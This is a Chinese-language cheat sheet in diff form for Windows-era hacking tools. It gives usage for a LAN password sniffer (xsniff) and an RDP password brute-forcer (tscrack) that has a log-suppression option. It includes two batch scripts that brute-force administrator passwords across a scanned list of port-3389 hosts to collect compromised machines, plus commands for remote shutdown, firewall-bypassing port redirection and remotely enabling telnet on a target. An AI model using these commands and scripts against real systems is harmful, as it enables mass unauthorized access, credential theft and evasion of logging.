@@ -1,0 +1,57 @@
+　　命令行方式嗅探器: xsniff.exe
+　　可捕获局域网内FTP/SMTP/POP3/HTTP协议密码
+　　参数说明
+　　-tcp 输出TCP数据报
+　　-udp 输出UDP数据报
+　　-icmp 输出ICMP数据报
+　　-pass 过滤密码信息
+　　-hide 后台运行
+　　-host 解析主机名
+　　-addr IP地址 过滤IP地址
+　　-port 端口 过滤端口
+　　-log 文件名 将输出保存到文件
+　　-asc 以ASCII形式输出
+　　-hex 以16进制形式输出
+　　用法示例
+　　xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中
+　　xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出
+　　终端服务密码破解: tscrack.exe
+　　参数说明
+　　-h 显示使用帮助
+　　-v 显示版本信息
+　　-s 在屏幕上打出解密能力
+　　-b 密码错误时发出的声音
+　　-t 同是发出多个连接（多线程）
+　　-N Prevent System Log entries on targeted server
+　　-U 卸载移除tscrack组件
+　　-f 使用－f后面的密码
+　　-F 间隔时间（频率）
+　　-l 使用－l后面的用户名
+　　-w 使用－w后面的密码字典
+　　-p 使用－p后面的密码
+　　-D 登录主页面
+　　用法示例
+　　tscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码
+　　tscrack 192.168.0.1 -l administrator -p 123456 用密码123456远程登陆192.168.0.1的administrator用户
+　　@if not exist ipcscan.txt goto noscan
+　　@for /f "tokens=1 delims= " %%i in (3389.txt) do call hack.bat %%i
+　　nscan
+　　@echo 3389.txt no find or scan faild
+　　(①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt)
+　　3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat
+　　@if not exist tscrack.exe goto noscan
+　　@tscrack %1 -l administrator -w pass.dic >>rouji.txt
+　　:noscan
+　　@echo tscrack.exe no find or scan faild
+　　(②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了)
+　　hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。
+　　其它
+　　Shutdown.exe
+　　Shutdown IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。）
+　　fpipe.exe (TCP端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙）
+　　fpipe -l 80 -s 1029 -r 80 当有人扫锚你的80端口时，他扫到的结果会完全是的主机信息
+　　Fpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。
+　　OpenTelnet.exe (远程开启telnet工具)
+　　opentelnet.exe IP 帐号　密码　ntlm认证方式　Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet ip 连接上对方。
+　　NTLM认证方式：0：不使用NTLM身份验证；1：先尝试NTLM身份验证，如果失败，再使用用户名和密码；2：只使用NTLM身份验证。
+　　ResumeTelnet.exe (OpenTelnet附带的另一个工具)
